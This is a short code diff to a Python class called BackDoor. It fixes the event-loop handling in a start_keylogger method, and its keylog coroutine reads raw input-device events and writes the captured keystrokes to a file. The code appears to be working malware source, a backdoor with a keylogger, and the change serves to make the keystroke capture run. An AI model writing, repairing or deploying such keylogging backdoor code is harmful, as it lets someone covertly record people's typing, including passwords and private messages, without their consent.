@@ -152,7 +152,8 @@ class BackDoor:
 
     def start_keylogger(self):
         device = InputDevice(self.device)
-        loop = asyncio.get_event_loop()
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
         loop.run_until_complete(self.keylog(device))
 
     async def keylog(self, device):
@@ -163,6 +164,7 @@ class BackDoor:
                         f.write(key_code_map[event.code])
                     except KeyError:
                         f.write(f" <Unmapped keycode: {event.code}> ")
+
 
     def process_yaml(self):
         with open('config.yaml', 'r') as f:
